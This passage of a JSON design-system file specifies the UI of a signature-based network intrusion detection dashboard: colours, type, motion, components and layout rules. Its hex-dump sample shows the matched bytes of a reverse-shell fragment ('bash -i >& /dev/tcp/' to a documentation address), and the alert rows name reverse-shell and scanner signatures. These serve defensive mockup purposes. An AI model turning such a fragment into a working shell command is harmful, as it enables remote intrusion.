@@ -1,0 +1,824 @@
+{
+  "schemaVersion": 2,
+  "generatedAt": "2026-10-17T18:34:36+00:00",
+  "title": "Design System: Signature NIDS",
+  "extensions": {
+    "colorMeta": {
+      "accent": {
+        "role": "primary",
+        "displayName": "Analyzer Selection Blue",
+        "canonical": "#2a62b8",
+        "dark": "#3f7fdd",
+        "tonalRamp": [
+          "#0e213e",
+          "#19396c",
+          "#23529a",
+          "#2d6ac7",
+          "#598bd9",
+          "#8baee4",
+          "#bdd1f0",
+          "#eaf1fa"
+        ]
+      },
+      "accent-hover": {
+        "role": "primary",
+        "displayName": "Pressed Selection Blue",
+        "canonical": "#2357a5",
+        "dark": "#4a8be8",
+        "tonalRamp": [
+          "#0d213f",
+          "#173a6d",
+          "#21529c",
+          "#2b6aca",
+          "#578cdb",
+          "#89aee6",
+          "#bcd1f1",
+          "#eaf1fb"
+        ]
+      },
+      "accent-ink": {
+        "role": "primary",
+        "displayName": "Selection Ink",
+        "canonical": "#ffffff",
+        "dark": "#ffffff",
+        "tonalRamp": [
+          "#262626",
+          "#424242",
+          "#5e5e5e",
+          "#7a7a7a",
+          "#999999",
+          "#b8b8b8",
+          "#d6d6d6",
+          "#f2f2f2"
+        ]
+      },
+      "accent-soft": {
+        "role": "primary",
+        "displayName": "Selection Wash",
+        "canonical": "#e3ecfa",
+        "dark": "#22385a",
+        "tonalRamp": [
+          "#0c2041",
+          "#143871",
+          "#1d50a0",
+          "#2568d0",
+          "#528ae0",
+          "#86ade9",
+          "#bad0f3",
+          "#e9f0fb"
+        ]
+      },
+      "chrome": {
+        "role": "neutral",
+        "displayName": "Toolbar Grey",
+        "canonical": "#f2f2ef",
+        "dark": "#26282b",
+        "tonalRamp": [
+          "#2a2a22",
+          "#49493b",
+          "#686855",
+          "#87876e",
+          "#a4a48e",
+          "#bfbfb0",
+          "#dadad2",
+          "#f4f4f1"
+        ]
+      },
+      "chrome-2": {
+        "role": "neutral",
+        "displayName": "Hover Grey",
+        "canonical": "#e7e7e3",
+        "dark": "#2f3135",
+        "tonalRamp": [
+          "#292923",
+          "#47473d",
+          "#666657",
+          "#848471",
+          "#a1a191",
+          "#bdbdb2",
+          "#d9d9d3",
+          "#f3f3f1"
+        ]
+      },
+      "chrome-3": {
+        "role": "neutral",
+        "displayName": "Press Grey",
+        "canonical": "#dcdcd7",
+        "dark": "#393c41",
+        "tonalRamp": [
+          "#292924",
+          "#47473e",
+          "#656558",
+          "#838372",
+          "#a0a092",
+          "#bcbcb3",
+          "#d9d9d3",
+          "#f3f3f1"
+        ]
+      },
+      "pane": {
+        "role": "neutral",
+        "displayName": "Pane White",
+        "canonical": "#ffffff",
+        "dark": "#1b1c1e",
+        "tonalRamp": [
+          "#262626",
+          "#424242",
+          "#5e5e5e",
+          "#7a7a7a",
+          "#999999",
+          "#b8b8b8",
+          "#d6d6d6",
+          "#f2f2f2"
+        ]
+      },
+      "pane-alt": {
+        "role": "neutral",
+        "displayName": "Pane Header Grey",
+        "canonical": "#f7f7f5",
+        "dark": "#202124",
+        "tonalRamp": [
+          "#2a2a22",
+          "#4a4a3b",
+          "#696954",
+          "#88886d",
+          "#a4a48e",
+          "#c0c0b0",
+          "#dbdbd2",
+          "#f4f4f1"
+        ]
+      },
+      "line": {
+        "role": "neutral",
+        "displayName": "Hairline",
+        "canonical": "#d5d5cf",
+        "dark": "#393b40",
+        "tonalRamp": [
+          "#292924",
+          "#47473e",
+          "#656558",
+          "#838372",
+          "#a0a092",
+          "#bcbcb3",
+          "#d9d9d3",
+          "#f3f3f1"
+        ]
+      },
+      "line-strong": {
+        "role": "neutral",
+        "displayName": "Strong Hairline",
+        "canonical": "#b9b9b2",
+        "dark": "#4b4e54",
+        "tonalRamp": [
+          "#282824",
+          "#45453f",
+          "#63635a",
+          "#808075",
+          "#9e9e94",
+          "#bbbbb4",
+          "#d8d8d4",
+          "#f3f3f2"
+        ]
+      },
+      "text": {
+        "role": "neutral",
+        "displayName": "Ink",
+        "canonical": "#1d1e20",
+        "dark": "#e5e5e2",
+        "tonalRamp": [
+          "#242628",
+          "#3f4146",
+          "#5a5d63",
+          "#747880",
+          "#94979e",
+          "#b4b6bb",
+          "#d4d6d8",
+          "#f2f2f3"
+        ]
+      },
+      "text-2": {
+        "role": "neutral",
+        "displayName": "Secondary Ink",
+        "canonical": "#4d5056",
+        "dark": "#b4b7bc",
+        "tonalRamp": [
+          "#242628",
+          "#3f4146",
+          "#595d64",
+          "#747881",
+          "#93979f",
+          "#b4b6bc",
+          "#d4d5d8",
+          "#f2f2f3"
+        ]
+      },
+      "text-3": {
+        "role": "neutral",
+        "displayName": "Tertiary Ink",
+        "canonical": "#686c73",
+        "dark": "#959aa1",
+        "tonalRamp": [
+          "#242628",
+          "#3f4146",
+          "#5a5d63",
+          "#747981",
+          "#94989e",
+          "#b4b7bb",
+          "#d4d6d8",
+          "#f2f2f3"
+        ]
+      },
+      "row-hover": {
+        "role": "neutral",
+        "displayName": "Row Hover Blue",
+        "canonical": "#eef3fb",
+        "dark": "#262e3a",
+        "tonalRamp": [
+          "#0f213e",
+          "#19396b",
+          "#245199",
+          "#2f69c6",
+          "#5a8ad8",
+          "#8bade4",
+          "#bdd0ef",
+          "#eaf0fa"
+        ]
+      },
+      "sev-critical-bg": {
+        "role": "severity",
+        "displayName": "Critical Rose",
+        "canonical": "#ffd9d7",
+        "dark": "#4a1e1f",
+        "tonalRamp": [
+          "#4c0400",
+          "#850700",
+          "#bd0900",
+          "#f50c00",
+          "#ff3d33",
+          "#ff7770",
+          "#ffb1ad",
+          "#ffe7e5"
+        ]
+      },
+      "sev-critical-fg": {
+        "role": "severity",
+        "displayName": "Critical Ink",
+        "canonical": "#8c1212",
+        "dark": "#ffb6b0",
+        "tonalRamp": [
+          "#440909",
+          "#750f0f",
+          "#a71515",
+          "#d91c1c",
+          "#e84a4a",
+          "#ef8080",
+          "#f6b7b7",
+          "#fce8e8"
+        ]
+      },
+      "sev-critical-mark": {
+        "role": "severity",
+        "displayName": "Critical Mark Red",
+        "canonical": "#d42c22",
+        "dark": "#f0554a",
+        "tonalRamp": [
+          "#420e0b",
+          "#721812",
+          "#a3221a",
+          "#d32c22",
+          "#e3574f",
+          "#eb8a84",
+          "#f4bcb9",
+          "#fbeae9"
+        ]
+      },
+      "sev-high-bg": {
+        "role": "severity",
+        "displayName": "High Apricot",
+        "canonical": "#ffe5cb",
+        "dark": "#47290f",
+        "tonalRamp": [
+          "#4c2600",
+          "#854200",
+          "#bd5e00",
+          "#f57a00",
+          "#ff9933",
+          "#ffb870",
+          "#ffd6ad",
+          "#fff2e5"
+        ]
+      },
+      "sev-high-fg": {
+        "role": "severity",
+        "displayName": "High Ink",
+        "canonical": "#853b00",
+        "dark": "#ffc690",
+        "tonalRamp": [
+          "#4c2200",
+          "#853b00",
+          "#bd5400",
+          "#f56d00",
+          "#ff8d33",
+          "#ffb070",
+          "#ffd2ad",
+          "#fff1e5"
+        ]
+      },
+      "sev-high-mark": {
+        "role": "severity",
+        "displayName": "High Mark Orange",
+        "canonical": "#e3730e",
+        "dark": "#f08a2c",
+        "tonalRamp": [
+          "#482504",
+          "#7d3f08",
+          "#b25a0b",
+          "#e7750e",
+          "#f3943f",
+          "#f7b478",
+          "#fad4b2",
+          "#fef2e7"
+        ]
+      },
+      "sev-medium-bg": {
+        "role": "severity",
+        "displayName": "Medium Butter",
+        "canonical": "#fff3bd",
+        "dark": "#3d3412",
+        "tonalRamp": [
+          "#4c3f00",
+          "#856c00",
+          "#bd9a00",
+          "#f5c800",
+          "#ffda33",
+          "#ffe570",
+          "#fff0ad",
+          "#fffae5"
+        ]
+      },
+      "sev-medium-fg": {
+        "role": "severity",
+        "displayName": "Medium Ink",
+        "canonical": "#6a4f00",
+        "dark": "#f0d47a",
+        "tonalRamp": [
+          "#4c3900",
+          "#856300",
+          "#bd8d00",
+          "#f5b600",
+          "#ffcb33",
+          "#ffdb70",
+          "#ffeaad",
+          "#fff9e5"
+        ]
+      },
+      "sev-medium-mark": {
+        "role": "severity",
+        "displayName": "Medium Mark Gold",
+        "canonical": "#c99a00",
+        "dark": "#d9b02a",
+        "tonalRamp": [
+          "#4c3b00",
+          "#856600",
+          "#bd9100",
+          "#f5bc00",
+          "#ffcf33",
+          "#ffde70",
+          "#ffecad",
+          "#fff9e5"
+        ]
+      },
+      "sev-low-bg": {
+        "role": "severity",
+        "displayName": "Low Sky",
+        "canonical": "#e1ecff",
+        "dark": "#1b2e4c",
+        "tonalRamp": [
+          "#001c4c",
+          "#003185",
+          "#0045bd",
+          "#005af5",
+          "#337eff",
+          "#70a5ff",
+          "#adcbff",
+          "#e5efff"
+        ]
+      },
+      "sev-low-fg": {
+        "role": "severity",
+        "displayName": "Low Ink",
+        "canonical": "#1c4686",
+        "dark": "#a9c7ff",
+        "tonalRamp": [
+          "#0d213f",
+          "#17396e",
+          "#21529c",
+          "#2a6aca",
+          "#568bdc",
+          "#89aee6",
+          "#bcd1f1",
+          "#eaf1fb"
+        ]
+      },
+      "sev-low-mark": {
+        "role": "severity",
+        "displayName": "Low Mark Blue",
+        "canonical": "#4a82d8",
+        "dark": "#6b9cf0",
+        "tonalRamp": [
+          "#0e213f",
+          "#18396d",
+          "#21519b",
+          "#2b6ac9",
+          "#578bdb",
+          "#8aaee6",
+          "#bcd1f1",
+          "#eaf1fa"
+        ]
+      },
+      "proto-tcp": {
+        "role": "protocol",
+        "displayName": "TCP Lavender",
+        "canonical": "#e8e6ff",
+        "dark": "#2b2944",
+        "tonalRamp": [
+          "#06004c",
+          "#0b0085",
+          "#0f00bd",
+          "#1400f5",
+          "#4333ff",
+          "#7c70ff",
+          "#b4adff",
+          "#e8e5ff"
+        ]
+      },
+      "proto-udp": {
+        "role": "protocol",
+        "displayName": "UDP Ice",
+        "canonical": "#dbeeff",
+        "dark": "#1d3245",
+        "tonalRamp": [
+          "#00284c",
+          "#004685",
+          "#0064bd",
+          "#0081f5",
+          "#339fff",
+          "#70bcff",
+          "#add8ff",
+          "#e5f3ff"
+        ]
+      },
+      "proto-icmp": {
+        "role": "protocol",
+        "displayName": "ICMP Orchid",
+        "canonical": "#fbe1fc",
+        "dark": "#3c2640",
+        "tonalRamp": [
+          "#430746",
+          "#750c79",
+          "#a611ac",
+          "#d716df",
+          "#e646ec",
+          "#ee7df2",
+          "#f5b5f8",
+          "#fce8fd"
+        ]
+      },
+      "proto-other": {
+        "role": "protocol",
+        "displayName": "Other Grey",
+        "canonical": "#f1f1ee",
+        "dark": "#25262a",
+        "tonalRamp": [
+          "#2a2a23",
+          "#49493c",
+          "#676755",
+          "#86866f",
+          "#a3a38f",
+          "#bfbfb1",
+          "#dadad2",
+          "#f3f3f1"
+        ]
+      },
+      "filter-ok": {
+        "role": "state",
+        "displayName": "Filter Valid Green",
+        "canonical": "#d5f3cf",
+        "dark": "#1d3a21",
+        "tonalRamp": [
+          "#173d0f",
+          "#286a1b",
+          "#399726",
+          "#49c431",
+          "#70d65c",
+          "#9be28d",
+          "#c6efbe",
+          "#edfaeb"
+        ]
+      },
+      "filter-bad": {
+        "role": "state",
+        "displayName": "Filter Invalid Rose",
+        "canonical": "#ffd9d7",
+        "dark": "#4a1e1f",
+        "tonalRamp": [
+          "#4c0400",
+          "#850700",
+          "#bd0900",
+          "#f50c00",
+          "#ff3d33",
+          "#ff7770",
+          "#ffb1ad",
+          "#ffe7e5"
+        ]
+      },
+      "live": {
+        "role": "state",
+        "displayName": "Live Green",
+        "canonical": "#1f9d45",
+        "dark": "#3cc466",
+        "tonalRamp": [
+          "#0d401c",
+          "#166f31",
+          "#1f9e45",
+          "#28cc5a",
+          "#55dd7e",
+          "#88e7a5",
+          "#bbf2cb",
+          "#eafbef"
+        ]
+      },
+      "warn": {
+        "role": "state",
+        "displayName": "Demo Amber",
+        "canonical": "#c78a00",
+        "dark": "#e0a72a",
+        "tonalRamp": [
+          "#4c3500",
+          "#855c00",
+          "#bd8300",
+          "#f5aa00",
+          "#ffc033",
+          "#ffd370",
+          "#ffe6ad",
+          "#fff7e5"
+        ]
+      },
+      "down": {
+        "role": "state",
+        "displayName": "Down Red",
+        "canonical": "#c8352b",
+        "dark": "#f0554a",
+        "tonalRamp": [
+          "#3f110e",
+          "#6d1d17",
+          "#9b2921",
+          "#c9352b",
+          "#db5f57",
+          "#e68f89",
+          "#f1bfbc",
+          "#faebea"
+        ]
+      },
+      "hex-hover": {
+        "role": "state",
+        "displayName": "Hex Hover Blue",
+        "canonical": "#c9dbf7",
+        "dark": "#22385a",
+        "tonalRamp": [
+          "#0a2043",
+          "#113873",
+          "#184fa4",
+          "#2067d5",
+          "#4d89e5",
+          "#83aced",
+          "#b8d0f4",
+          "#e9f0fc"
+        ]
+      }
+    },
+    "typographyMeta": {
+      "headline": {
+        "displayName": "Headline",
+        "purpose": "Dialog titles only."
+      },
+      "state": {
+        "displayName": "State Word",
+        "purpose": "The summary-line state word; live green when calm, severity mark colour for critical and high."
+      },
+      "title": {
+        "displayName": "Title",
+        "purpose": "Brand name, statistics section titles, empty-state headings."
+      },
+      "body": {
+        "displayName": "Body",
+        "purpose": "All UI copy and tree rows; buttons at 12.5px; pane titles at 600."
+      },
+      "grid": {
+        "displayName": "Grid",
+        "purpose": "Packet, alert, host and rule lists on 22px rows with tabular numerals."
+      },
+      "label": {
+        "displayName": "Label",
+        "purpose": "Captions, context-menu labels, mini-table headers, scope tags."
+      },
+      "mono": {
+        "displayName": "Mono",
+        "purpose": "Addresses, ports, bytes, timestamps, display filter input, hex dumps, rule definitions and pattern fields only."
+      }
+    },
+    "shadows": [
+      {
+        "name": "menu",
+        "value": "0 6px 24px rgba(20, 22, 26, .16), 0 1px 3px rgba(20, 22, 26, .12)",
+        "dark": "0 8px 28px rgba(0, 0, 0, .5), 0 1px 3px rgba(0, 0, 0, .4)",
+        "purpose": "Floating layers only: context menu, filter suggestions, plot tooltip, toasts, dialogs."
+      },
+      {
+        "name": "filter-focus",
+        "value": "0 0 0 2px color-mix(in srgb, var(--accent) 22%, transparent)",
+        "purpose": "Focus halo on the display filter field."
+      }
+    ],
+    "motion": [
+      {
+        "name": "state",
+        "value": ".15s ease-out",
+        "purpose": "Hover, press, toggle, chevron rotation and opacity reveals."
+      },
+      {
+        "name": "toast-in",
+        "value": ".2s cubic-bezier(.16, 1, .3, 1)",
+        "purpose": "Toast entry, 8px rise."
+      },
+      {
+        "name": "row-fresh",
+        "value": "1.6s ease-out",
+        "purpose": "A newly arrived row flashes its tint once."
+      },
+      {
+        "name": "reduced",
+        "value": "prefers-reduced-motion: durations .01ms",
+        "purpose": "All motion collapses under reduced motion."
+      }
+    ],
+    "breakpoints": [
+      {
+        "name": "compact",
+        "value": "1100px",
+        "purpose": "Toolbar labels collapse to icons."
+      },
+      {
+        "name": "mobile",
+        "value": "760px",
+        "purpose": "Panes stack into a scrolling page; splitters hidden; status bar sticky."
+      }
+    ],
+    "themes": {
+      "light": ":root default",
+      "dark": "@media (prefers-color-scheme: dark) :root:not([data-theme=light]) and :root[data-theme=dark]"
+    }
+  },
+  "components": [
+    {
+      "name": "Button",
+      "kind": "button",
+      "refersTo": "button",
+      "description": "Default pane-header action: hairline-bordered 4px rectangle with optional kbd hint.",
+      "html": "<button class=\"ds-btn\">False positive <kbd class=\"ds-kbd\">F</kbd></button>",
+      "css": ".ds-btn{display:inline-flex;align-items:center;gap:6px;height:26px;padding:0 10px;border:1px solid var(--line-strong,#b9b9b2);border-radius:4px;background:var(--pane,#fff);color:var(--text,#1d1e20);font:12.5px/1.4 \"Segoe UI Variable Text\",\"Segoe UI\",system-ui,sans-serif;cursor:pointer;transition:background-color .15s ease-out,border-color .15s ease-out}.ds-btn:hover{background:var(--chrome-2,#e7e7e3)}.ds-btn:active{background:var(--chrome-3,#dcdcd7)}.ds-btn:focus-visible{outline:2px solid var(--focus,#2a62b8);outline-offset:1px}.ds-kbd{display:inline-block;min-width:20px;padding:0 5px;text-align:center;border:1px solid var(--line-strong,#b9b9b2);border-bottom-width:2px;border-radius:3px;background:var(--pane-alt,#f7f7f5);font:10.5px/17px ui-monospace,Consolas,monospace;color:var(--text-3,#686c73)}"
+    },
+    {
+      "name": "Primary Button",
+      "kind": "button",
+      "refersTo": "button-primary",
+      "description": "The one primary action per pane header, e.g. Acknowledge.",
+      "html": "<button class=\"ds-btn-primary\"><svg width=\"15\" height=\"15\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"1.7\" stroke-linecap=\"round\" stroke-linejoin=\"round\"><path d=\"M5 12.8l4.4 4.4L19 7.6\"/></svg>Acknowledge</button>",
+      "css": ".ds-btn-primary{display:inline-flex;align-items:center;gap:6px;height:26px;padding:0 10px;border:1px solid var(--accent,#2a62b8);border-radius:4px;background:var(--accent,#2a62b8);color:var(--accent-ink,#fff);font:600 12.5px/1.4 \"Segoe UI Variable Text\",\"Segoe UI\",system-ui,sans-serif;cursor:pointer;transition:background-color .15s ease-out}.ds-btn-primary:hover{background:var(--accent-hover,#2357a5)}.ds-btn-primary:focus-visible{outline:2px solid var(--focus,#2a62b8);outline-offset:1px}"
+    },
+    {
+      "name": "Toolbar Tool",
+      "kind": "button",
+      "refersTo": "tool",
+      "description": "Borderless 28px toolbar command that gains a hairline on hover.",
+      "html": "<button class=\"ds-tool\"><svg width=\"16\" height=\"16\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"1.7\" stroke-linecap=\"round\"><path d=\"M9 5.5v13M15 5.5v13\"/></svg>Pause</button>",
+      "css": ".ds-tool{display:inline-flex;align-items:center;gap:6px;height:28px;padding:0 9px;border:1px solid transparent;border-radius:4px;background:transparent;color:var(--text,#1d1e20);font:13px/1.4 \"Segoe UI Variable Text\",\"Segoe UI\",system-ui,sans-serif;cursor:pointer;transition:background-color .15s ease-out,border-color .15s ease-out}.ds-tool:hover{background:var(--chrome-2,#e7e7e3);border-color:var(--line,#d5d5cf)}.ds-tool:active{background:var(--chrome-3,#dcdcd7)}.ds-tool:focus-visible{outline:2px solid var(--focus,#2a62b8);outline-offset:1px}"
+    },
+    {
+      "name": "Display Filter",
+      "kind": "input",
+      "refersTo": "filter-field",
+      "description": "Monospace display-filter field that turns green when valid and red when invalid.",
+      "html": "<div class=\"ds-filter\"><input class=\"ds-filter-input\" value=\"sev >= high && ip.src == 203.0.113.66\" aria-label=\"Display filter\"></div><div class=\"ds-filter ds-filter-ok\" style=\"margin-top:8px\"><input class=\"ds-filter-input\" value=\"status == new\" aria-label=\"Valid filter\"></div><div class=\"ds-filter ds-filter-bad\" style=\"margin-top:8px\"><input class=\"ds-filter-input\" value=\"sev >=\" aria-label=\"Invalid filter\"></div>",
+      "css": ".ds-filter{display:flex;align-items:center;height:28px;width:420px;background:var(--pane,#fff);border:1px solid var(--line-strong,#b9b9b2);border-radius:4px;transition:background-color .15s ease-out,border-color .15s ease-out}.ds-filter:focus-within{border-color:var(--accent,#2a62b8);box-shadow:0 0 0 2px color-mix(in srgb,var(--accent,#2a62b8) 22%,transparent)}.ds-filter-ok{background:var(--filter-ok,#d5f3cf)}.ds-filter-bad{background:var(--filter-bad,#ffd9d7)}.ds-filter-input{flex:1;min-width:0;height:100%;padding:0 8px;border:0;outline:0;background:transparent;font:12.5px ui-monospace,\"Cascadia Mono\",Consolas,monospace;color:var(--text,#1d1e20)}"
+    },
+    {
+      "name": "Filter Preset",
+      "kind": "chip",
+      "refersTo": "preset",
+      "description": "One-click saved filter; pressed state is a blue wash.",
+      "html": "<button class=\"ds-preset\">Untriaged</button> <button class=\"ds-preset\" aria-pressed=\"true\">High &amp; critical</button>",
+      "css": ".ds-preset{height:24px;padding:0 9px;border:1px solid var(--line,#d5d5cf);border-radius:4px;background:var(--pane,#fff);color:var(--text-2,#4d5056);font:12px \"Segoe UI Variable Text\",\"Segoe UI\",system-ui,sans-serif;cursor:pointer;transition:background-color .15s ease-out,color .15s ease-out,border-color .15s ease-out}.ds-preset:hover{border-color:var(--line-strong,#b9b9b2);color:var(--text,#1d1e20)}.ds-preset[aria-pressed=\"true\"]{background:var(--accent-soft,#e3ecfa);border-color:var(--accent,#2a62b8);color:var(--text,#1d1e20)}.ds-preset:focus-visible{outline:2px solid var(--focus,#2a62b8);outline-offset:1px}"
+    },
+    {
+      "name": "View Tabs",
+      "kind": "nav",
+      "refersTo": "tab",
+      "description": "Analyzer view tabs with accent underline and a hot count badge.",
+      "html": "<nav class=\"ds-tabs\"><button class=\"ds-tab\" aria-selected=\"true\">Alerts <span class=\"ds-count ds-hot\">76</span></button><button class=\"ds-tab\">Packets</button><button class=\"ds-tab\">Endpoints <span class=\"ds-count\">15</span></button></nav>",
+      "css": ".ds-tabs{display:flex;padding:0 8px;background:var(--chrome,#f2f2ef);border-bottom:1px solid var(--line,#d5d5cf)}.ds-tab{position:relative;display:inline-flex;align-items:center;gap:6px;height:31px;padding:0 12px;border:0;background:transparent;color:var(--text-2,#4d5056);font:13px \"Segoe UI Variable Text\",\"Segoe UI\",system-ui,sans-serif;cursor:pointer;transition:color .15s ease-out,background-color .15s ease-out}.ds-tab:hover{color:var(--text,#1d1e20);background:var(--chrome-2,#e7e7e3)}.ds-tab[aria-selected=\"true\"]{color:var(--text,#1d1e20);font-weight:600}.ds-tab[aria-selected=\"true\"]::after{content:\"\";position:absolute;left:8px;right:8px;bottom:-1px;height:2px;background:var(--accent,#2a62b8)}.ds-tab:focus-visible{outline:2px solid var(--focus,#2a62b8);outline-offset:-2px}.ds-count{font:11px ui-monospace,Consolas,monospace;color:var(--text-3,#686c73)}.ds-hot{color:var(--accent-ink,#fff);background:var(--accent,#2a62b8);padding:0 5px;border-radius:3px;line-height:17px;font-weight:600}"
+    },
+    {
+      "name": "Alert List Rows",
+      "kind": "custom",
+      "refersTo": "grid-row",
+      "description": "Coloring-rule rows: untriaged rows tinted by severity with a shape mark, triaged rows neutral, selection solid blue.",
+      "html": "<table class=\"ds-grid\"><tbody><tr class=\"ds-crit\"><td class=\"ds-mono\">11:31:02.570</td><td><svg width=\"10\" height=\"10\" viewBox=\"0 0 12 12\" class=\"ds-m-crit\"><path d=\"M6 .2 11.8 6 6 11.8.2 6z\" fill=\"currentColor\"/></svg> Critical</td><td class=\"ds-mono\">192.0.2.77:44816</td><td>Interactive reverse shell one-liner</td></tr><tr class=\"ds-high\"><td class=\"ds-mono\">11:30:59.354</td><td><svg width=\"10\" height=\"10\" viewBox=\"0 0 12 12\" class=\"ds-m-high\"><path d=\"M6 1.4 11.2 10.4H.8z\" fill=\"currentColor\"/></svg> High</td><td class=\"ds-mono\">203.0.113.200:4622</td><td>Suspicious PowerShell User-Agent</td></tr><tr class=\"ds-sel\"><td class=\"ds-mono\">11:30:54.508</td><td><svg width=\"10\" height=\"10\" viewBox=\"0 0 12 12\"><path d=\"M6 .2 11.8 6 6 11.8.2 6z\" fill=\"currentColor\"/></svg> Critical</td><td class=\"ds-mono\">203.0.113.200:60386</td><td>Interactive reverse shell one-liner</td></tr><tr class=\"ds-ack\"><td class=\"ds-mono\">11:30:44.867</td><td><svg width=\"10\" height=\"10\" viewBox=\"0 0 12 12\" class=\"ds-m-med\"><circle cx=\"6\" cy=\"6\" r=\"4.2\" fill=\"currentColor\"/></svg> Medium</td><td class=\"ds-mono\">198.51.100.23:5190</td><td>sqlmap scanner User-Agent</td></tr><tr class=\"ds-low\"><td class=\"ds-mono\">11:30:40.036</td><td><svg width=\"10\" height=\"10\" viewBox=\"0 0 12 12\" class=\"ds-m-low\"><circle cx=\"6\" cy=\"6\" r=\"3.6\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"1.6\"/></svg> Low</td><td class=\"ds-mono\">192.0.2.10:45729</td><td>ICMP sweep</td></tr></tbody></table>",
+      "css": ".ds-grid{border-collapse:separate;border-spacing:0;font:12.5px \"Segoe UI Variable Text\",\"Segoe UI\",system-ui,sans-serif;font-variant-numeric:tabular-nums;width:640px}.ds-grid td{height:22px;padding:0 8px;white-space:nowrap;border-bottom:1px solid color-mix(in srgb,var(--line,#d5d5cf) 45%,transparent)}.ds-grid tr:hover td{box-shadow:inset 0 0 0 9999px color-mix(in srgb,var(--text,#1d1e20) 4%,transparent)}.ds-mono{font-family:ui-monospace,\"Cascadia Mono\",Consolas,monospace;font-size:12px}.ds-crit td{background:var(--sev-critical-bg,#ffd9d7);color:var(--sev-critical-fg,#8c1212);font-weight:600}.ds-high td{background:var(--sev-high-bg,#ffe5cb);color:var(--sev-high-fg,#853b00);font-weight:600}.ds-low td{background:var(--sev-low-bg,#e1ecff);color:var(--sev-low-fg,#1c4686);font-weight:600}.ds-ack td{background:var(--pane,#fff);color:var(--text-2,#4d5056)}.ds-sel td{background:var(--accent,#2a62b8);color:var(--accent-ink,#fff)}.ds-m-crit{color:var(--sev-critical-mark,#d42c22)}.ds-m-high{color:var(--sev-high-mark,#e3730e)}.ds-m-med{color:var(--sev-medium-mark,#c99a00)}.ds-m-low{color:var(--sev-low-mark,#4a82d8)}"
+    },
+    {
+      "name": "Hex Pane",
+      "kind": "custom",
+      "refersTo": "",
+      "description": "Offset | hex | ASCII dump with matched bytes in solid accent.",
+      "html": "<div class=\"ds-hex\"><div class=\"ds-hl\"><span class=\"ds-off\">0000</span><span><i class=\"ds-m\">62 61 73 68 20 2d 69 20</i> <i class=\"ds-m\">3e 26</i> 20 2f 64 65 76 2f</span><span><i class=\"ds-m\">bash -i &gt;&amp;</i> /dev/</span></div><div class=\"ds-hl\"><span class=\"ds-off\">0010</span><span>74 63 70 2f 32 30 33 2e  30 2e 31 31 33 2e 36 36</span><span>tcp/203.0.113.66</span></div></div>",
+      "css": ".ds-hex{padding:6px 12px;font:12px/20px ui-monospace,\"Cascadia Mono\",Consolas,monospace;white-space:pre;background:var(--pane,#fff);color:var(--text,#1d1e20)}.ds-hl{display:flex;gap:22px}.ds-off{color:var(--text-3,#686c73)}.ds-hex i{font-style:normal}.ds-m{background:var(--hex-match,#2a62b8);color:var(--hex-match-ink,#fff)}.ds-hex i:hover{background:var(--hex-hover,#c9dbf7)}"
+    },
+    {
+      "name": "Status Bar",
+      "kind": "custom",
+      "refersTo": "",
+      "description": "Pinned status strip with flat expert-info dot and hairline-separated counts.",
+      "html": "<div class=\"ds-status\"><button class=\"ds-expert\"><span class=\"ds-dot\"></span>76 untriaged · 27 critical, 30 high, 19 medium</button><span class=\"ds-msg\"></span><span class=\"ds-cell\">Displayed: <b>91</b></span><span class=\"ds-cell\">Rules: <b>30</b></span></div>",
+      "css": ".ds-status{display:flex;align-items:center;gap:12px;height:25px;padding:0 8px 0 4px;background:var(--chrome,#f2f2ef);border-top:1px solid var(--line,#d5d5cf);font:12px \"Segoe UI Variable Text\",\"Segoe UI\",system-ui,sans-serif;color:var(--text-2,#4d5056);font-variant-numeric:tabular-nums}.ds-expert{display:inline-flex;align-items:center;gap:6px;height:21px;padding:0 8px;border:1px solid transparent;border-radius:3px;background:transparent;color:inherit;font:inherit;cursor:pointer}.ds-expert:hover{background:var(--chrome-2,#e7e7e3);border-color:var(--line,#d5d5cf)}.ds-expert:focus-visible{outline:2px solid var(--focus,#2a62b8);outline-offset:1px}.ds-dot{width:10px;height:10px;border-radius:50%;background:var(--sev-critical-mark,#d42c22)}.ds-msg{flex:1}.ds-cell{padding:0 10px;border-left:1px solid var(--line,#d5d5cf)}.ds-cell b{font-weight:600;color:var(--text,#1d1e20)}"
+    }
+  ],
+  "narrative": {
+    "northStar": "The Packet Analyzer",
+    "overview": "The dashboard is the packet analyzer the owner already knows: a toolbar, a display filter, view tabs, and stacked list / dissection tree / hex panes divided by draggable hairline splitters, with a status bar pinned to the bottom. Severity and protocol arrive the way they do in Wireshark, as pastel coloring-rule row tints, not as cards, tiles, or glowing indicators. Light analyzer chrome is the default; a matching dark theme follows `prefers-color-scheme` and can be forced with `data-theme`.\n\nDensity is that of a desktop tool: 13px system UI type, 22px grid rows, 24 to 28px controls, hairline borders everywhere and no ornament. Calm looks calm because the chrome is neutral grey and white; an untriaged alert is impossible to miss because only untriaged rows carry colour. The signature interaction links the tree to the bytes: hovering or selecting the \"Matched content\" node highlights the exact matched bytes in the hex pane, and clicking a byte selects its tree node.\n\nThe world rejects the dark SOC card grid: no KPI tile wall, no glowing or pulsing status dots, no decorative gradients.",
+    "keyCharacteristics": [
+      "Three-pane analyzer grammar: list, dissection tree, offset | hex | ASCII dump.",
+      "Severity as row tint plus a fixed shape ramp, never colour alone.",
+      "One blue accent for selection, focus, and primary actions.",
+      "System UI type; monospace reserved for wire data.",
+      "Flat, hairline-divided surfaces; shadows only on floating layers.",
+      "State-only motion of 150 to 200ms; new rows flash their tint once."
+    ],
+    "rules": [
+      {
+        "name": "The One Accent Rule",
+        "body": "Blue is the only interactive colour. Selection, focus, and primary actions use the accent; nothing else does.",
+        "section": "colors"
+      },
+      {
+        "name": "The Untriaged-Only Tint Rule",
+        "body": "Only untriaged alert rows carry severity tint. Acknowledged, false-positive, and muted rows drop to Pane White with Secondary Ink (false positives also strike through the rule name; muted rows dim to 78%). The colour on screen is the work left to do.",
+        "section": "colors"
+      },
+      {
+        "name": "The Shape-Plus-Colour Rule",
+        "body": "Severity is always a fixed mark plus colour: low is a hollow circle, medium a filled dot, high a filled triangle, critical a filled diamond. Never signal severity by colour alone, and never change the shape mapping.",
+        "section": "colors"
+      },
+      {
+        "name": "The Wire Data Rule",
+        "body": "Monospace is only for addresses, ports, bytes, timestamps, and byte or pattern fields. Signature names, severity, status, counts of things, and all prose stay in the UI face.",
+        "section": "typography"
+      },
+      {
+        "name": "The Summary Line Rule",
+        "body": "The overview is one summary line over a full-width axis-labelled I/O strip. Never a KPI tile grid.",
+        "section": "layout"
